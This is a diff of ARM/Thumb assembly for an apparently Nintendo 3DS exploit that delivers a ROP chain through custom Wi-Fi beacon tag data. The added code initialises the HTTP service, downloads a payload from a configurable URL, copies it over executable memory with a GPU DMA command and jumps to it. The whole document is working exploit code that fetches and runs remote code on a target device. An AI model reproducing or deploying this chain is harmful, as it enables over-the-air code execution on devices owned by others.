@@ -7,7 +7,7 @@
 @ Beacon tag data for custom OUI-type 0x80. The inital ROP-chain in smashbros_beaconoui15.s loads this ROP-chain data.
 
 _start:
-.byte 0x00, 0x1f, 0x32 @ OUI
+.byte 0x00, 0x1f, 0x32 @ OUI (offset 0x0)
 .byte 0x80 @ OUI type
 
 ropstart:
@@ -79,12 +79,15 @@ add r1, pc, #1
 bx r1
 .thumb
 
+bl init_sp
+
 ldr r0, =LOCALWLAN_SHUTDOWN
 blx r0
 
 bl ACU_WaitInternetConnection
 
-blx crasharm
+arm11code_finish:
+b arm11code_finish
 
 .pool
 
@@ -93,82 +96,10 @@ blx crasharm
 .byte 0xff, 0xff @ Padding, tagid/tagsize bytes would be located here in memory.
 
 tag1:
-.byte 0x00, 0x1f, 0x32 @ OUI
+.byte 0x00, 0x1f, 0x32 @ OUI (offset 0x100)
 .byte 0x81 @ OUI type
 
 tag1_code:
-
-srv_init: @ r0 = srv handle*
-push {r1, r2, r4, r5, lr}
-mov r4, r0
-
-mov r1, #0
-ldr r0, =0x3a767273
-str r0, [sp, #0]
-str r1, [sp, #4]
-
-mov r1, sp
-mov r0, r4
-blx svcConnectToPort
-cmp r0, #0
-bne srv_init_end
-
-blx get_cmdbufptr
-mov r5, r0
-
-ldr r1, =0x00010002
-str r1, [r5, #0]
-mov r1, #0x20
-str r1, [r5, #4]
-
-ldr r0, [r4]
-blx svcSendSyncRequest
-cmp r0, #0
-bne srv_init_end
-ldr r0, [r5, #4]
-
-srv_init_end:
-pop {r1, r2, r4, r5, pc}
-.pool
-
-srv_GetServiceHandle: @ r0 = srv handle*, r1 = out handle*, r2 = servicename, r3=servlen
-push {r3, r4, r5, r6, r7, lr}
-mov r5, r0
-mov r6, r1
-mov r7, r2
-
-blx get_cmdbufptr
-mov r4, r0
-
-ldr r1, =0x00050100
-str r1, [r4, #0]
-add r1, r4, #4
-
-ldr r2, [r7, #0]
-ldr r3, [r7, #4]
-str r2, [r1, #0]
-str r3, [r1, #4]
-
-ldr r2, [sp, #0]
-str r2, [r4, #12]
-mov r2, #0
-str r2, [r4, #16]
-
-ldr r0, [r5]
-blx svcSendSyncRequest
-cmp r0, #0
-bne srv_GetServiceHandle_end
-
-ldr r0, [r4, #4]
-cmp r0, #0
-bne srv_GetServiceHandle_end
-
-ldr r1, [r4, #12]
-str r1, [r6]
-
-srv_GetServiceHandle_end:
-pop {r3, r4, r5, r6, r7, pc}
-.pool
 
 ACU_GetWifiStatus:
 push {r0, r1, r4, lr}
@@ -194,18 +125,18 @@ pop {r1, r2, r4, pc}
 .pool
 
 ACU_WaitInternetConnection:
-push {lr}
 sub sp, sp, #12
-add r0, sp, #0
-bl srv_init
 
-add r0, sp, #0
-add r1, sp, #4
-add r2, sp, #8
-ldr r3, =0x753a6361
-str r3, [r2]
-mov r3, #4
-bl srv_GetServiceHandle
+add r0, sp, #4
+add r1, sp, #8
+ldr r2, =0x753a6361
+str r2, [r1]
+mov r2, #4
+mov r3, #0
+ldr r4, =SRV_GETSERVICEHANDLE
+blx r4
+cmp r0, #0
+bne ACU_WaitInternetConnection_end
 
 ACU_WaitInternetConnection_lp:
 add r0, sp, #4
@@ -220,33 +151,12 @@ bne ACU_WaitInternetConnection_lp
 ldr r0, [sp, #4]
 blx svcCloseHandle
 
-ldr r0, [sp, #0]
-blx svcCloseHandle
-
+ACU_WaitInternetConnection_end:
 add sp, sp, #12
-pop {pc}
+bl download_payload
 .pool
 
-.thumb
-
-.fill ((tag1 + 0xfc) - .), 1, 0xffffffff
-.byte 0xff, 0xff @ Pad the tag-data to 0xfe-bytes.
-.byte 0xff, 0xff @ Padding, tagid/tagsize bytes would be located here in memory.
-
-tag2:
-.byte 0x00, 0x1f, 0x32 @ OUI
-.byte 0x81 @ OUI type
-
-tag2_code:
 .arm
-
-.type svcConnectToPort, %function
-svcConnectToPort:
-	str r0, [sp,#-0x4]!
-	svc 0x2D
-	ldr r3, [sp], #4
-	str r1, [r3]
-	bx lr
 
 .type svcCloseHandle, %function
 svcCloseHandle:
@@ -264,9 +174,310 @@ mrc 15, 0, r0, cr13, cr0, 3
 add r0, r0, #0x80
 bx lr
 
-crasharm:
-.word 0xffffffff
+.thumb
+
+HTTPC_sendcmd:
+push {r0, r1, r2, r3, r4, lr}
+blx get_cmdbufptr
+mov r4, r0
+
+ldr r1, [sp, #12]
+str r1, [r4, #0]
+ldr r1, [sp, #4]
+str r1, [r4, #4]
+ldr r1, [sp, #8]
+str r1, [r4, #8]
+
+ldr r0, [sp, #0]
+ldr r0, [r0]
+blx svcSendSyncRequest
+cmp r0, #0
+bne HTTPC_sendcmd_end
+ldr r0, [r4, #4]
+
+HTTPC_sendcmd_end:
+add sp, sp, #16
+pop {r4, pc}
+.pool
+
+HTTPC_Initialize:
+push {r0, r1, r4, lr}
+blx get_cmdbufptr
+mov r4, r0
+
+ldr r1, =0x00010044
+str r1, [r4, #0]
+ldr r1, =0x1000
+str r1, [r4, #4]
+mov r1, #0x20
+str r1, [r4, #8]
+mov r1, #0
+str r1, [r4, #16]
+str r1, [r4, #20]
+
+ldr r0, [sp, #0]
+ldr r0, [r0]
+blx svcSendSyncRequest
+cmp r0, #0
+bne HTTPC_Initialize_end
+ldr r0, [r4, #4]
+
+HTTPC_Initialize_end:
+pop {r1, r2, r4, pc}
+.pool
+
+HTTPC_InitializeConnectionSession:
+mov r2, #0x20
+ldr r3, =0x00080042
+b HTTPC_sendcmd
+.pool
+
+HTTPC_SetProxyDefault:
+ldr r3, =0x000e0040
+b HTTPC_sendcmd
+.pool
+
+HTTPC_CloseContext:
+ldr r3, =0x00030040
+b HTTPC_sendcmd
+.pool
+
+HTTPC_BeginRequest:
+ldr r3, =0x00090040
+b HTTPC_sendcmd
+.pool
+
+.fill ((tag1 + 0xfc) - .), 1, 0xffffffff
+.byte 0xff, 0xff @ Pad the tag-data to 0xfe-bytes.
+.byte 0xff, 0xff @ Padding, tagid/tagsize bytes would be located here in memory.
+
+tag2:
+.byte 0x00, 0x1f, 0x32 @ OUI (offset 0x200)
+.byte 0x82 @ OUI type
+
+tag2_code:
+
+HTTPC_CreateContext: @ r0=handle*, r1=ctxhandle*, r2=urlbuf*, r3=urlbufsize
+push {r0, r1, r2, r3, r4, lr}
+blx get_cmdbufptr
+mov r4, r0
+
+ldr r1, =0x00020082
+str r1, [r4, #0]
+ldr r1, [sp, #12]
+str r1, [r4, #4]
+lsl r1, r1, #4
+mov r2, #0xa
+orr r1, r1, r2
+str r1, [r4, #12]
+ldr r2, [sp, #8]
+str r2, [r4, #16]
+mov r3, #1
+str r3, [r4, #8]
+
+ldr r0, [sp, #0]
+ldr r0, [r0]
+blx svcSendSyncRequest
+cmp r0, #0
+bne HTTPC_CreateContext_end
+ldr r0, [r4, #4]
+cmp r0, #0
+bne HTTPC_CreateContext_end
+ldr r2, [sp, #4]
+ldr r1, [r4, #8]
+str r1, [r2]
+
+HTTPC_CreateContext_end:
+add sp, sp, #16
+pop {r4, pc}
+.pool
+
+HTTPC_ReceiveData: @ r0=handle*, r1=ctxhandle, r2=buf*, r3=bufsize
+push {r0, r1, r2, r3, r4, lr}
+blx get_cmdbufptr
+mov r4, r0
+
+ldr r1, =0x000B0082
+str r1, [r4, #0]
+ldr r1, [sp, #4]
+str r1, [r4, #4]
+ldr r1, [sp, #12]
+str r1, [r4, #8]
+lsl r1, r1, #4
+mov r2, #0xc
+orr r1, r1, r2
+str r1, [r4, #12]
+ldr r2, [sp, #8]
+str r2, [r4, #16]
+
+ldr r0, [sp, #0]
+ldr r0, [r0]
+blx svcSendSyncRequest
+cmp r0, #0
+bne HTTPC_ReceiveData_end
+ldr r0, [r4, #4]
+
+HTTPC_ReceiveData_end:
+add sp, sp, #16
+pop {r4, pc}
+
+download_payload:
+push {lr}
+sub sp, sp, #24
+
+mov r4, #0
+
+add r0, sp, #4
+add r1, sp, #8
+ldr r3, =0x70747468
+str r3, [r1, #0]
+ldr r3, =0x433a
+str r3, [r1, #4]
+mov r2, #6
+mov r3, #0
+ldr r4, =SRV_GETSERVICEHANDLE
+blx r4
+cmp r0, #0
+bne download_payload_end
+
+add r0, sp, #16
+add r1, sp, #8
+mov r2, #6
+mov r3, #0
+ldr r4, =SRV_GETSERVICEHANDLE
+blx r4
+cmp r0, #0
+bne download_payload_end
+
+add r0, sp, #4
+bl HTTPC_Initialize
+cmp r0, #0
+bne download_payload_endhttp
+
+add r0, sp, #4
+add r1, sp, #20
+adr r2, payloadurl
+adr r3, payloadurl_end
+sub r3, r3, r2
+bl HTTPC_CreateContext
+cmp r0, #0
+bne download_payload_endhttp
+
+add r0, sp, #16
+ldr r1, [sp, #20]
+bl HTTPC_InitializeConnectionSession
+cmp r0, #0
+bne download_payload_endhttp
+
+add r0, sp, #16
+ldr r1, [sp, #20]
+bl HTTPC_BeginRequest
+cmp r0, #0
+bne download_payload_endhttp
+
+add r0, sp, #16
+ldr r1, [sp, #20]
+ldr r6, =TMPBUF_ADR
+mov r2, r6
+ldr r3, =0x4000
+bl HTTPC_ReceiveData
+cmp r0, #0
+bne download_payload_endhttp
+
+add r0, sp, #16
+ldr r1, [sp, #20]
+bl HTTPC_CloseContext
+cmp r0, #0
+bne download_payload_endhttp
+b download_payload_stage2
 
 .fill ((tag2 + 0xfc) - .), 1, 0xffffffff
+.byte 0xff, 0xff
+.byte 0xff, 0xff
+
+tag3:
+.byte 0x00, 0x1f, 0x32 @ OUI (offset 0x300)
+.byte 0x83 @ OUI type
+
+tag3_code:
+
+.pool
+
+download_payload_stage2:
+mov r4, #1
+
+download_payload_endhttp:
+ldr r0, [sp, #4]
+blx svcCloseHandle
+
+ldr r0, [sp, #16]
+blx svcCloseHandle
+
+cmp r4, #0
+beq download_payload_end
+
+mov r0, r6
+ldr r1, =0x4000
+ldr r2, =GSPGPU_FLUSHDCACHE
+blx r2
+
+mov r3, #0
+str r3, [sp, #0] @ height0
+str r3, [sp, #4] @ width1
+str r3, [sp, #8] @ height1
+mov r3, #8
+str r3, [sp, #12] @ flags
+mov r0, r6
+ldr r1, =(0x30000000+TEXT_FCRAMOFFSET+0x9000) @ dstaddr
+ldr r2, =0x4000 @ size
+mov r3, #0 @ width0
+
+ldr r5, =GXLOW_CMD4
+blx r5
+
+ldr r0, =1000000000
+mov r1, #0
+ldr r2, =SVCSLEEPTHREAD
+blx r2
+
+mov r1, #0
+mov r2, r1
+ldr r3, =0x1000
+
+download_payload_memclr:
+str r2, [r6, r1]
+add r1, r1, #4
+cmp r1, r3
+blt download_payload_memclr
+
+ldr r1, =GXLOW_CMD4
+str r1, [r6, #0x1c]
+ldr r1, =GSPGPU_FLUSHDCACHE
+str r1, [r6, #0x20]
+mov r1, #0xd @ flags
+str r1, [r6, #0x48]
+ldr r1, =GSPGPU_SERVHANDLEADR
+str r1, [r6, #0x58]
+
+mov r0, r6
+ldr r1, =0x00109000
+blx r1
+
+download_payload_end:
+b download_payload_end
+.pool
+
+init_sp:
+ldr r0, =(TMPBUF_ADR+0x5000)
+mov sp, r0
+bx lr
+.pool
+
+payloadurl:
+.string PAYLOADURL
+.align 2
+payloadurl_end:
+
+.fill ((tag3 + 0xfc) - .), 1, 0xffffffff
 .byte 0xff, 0xff
 
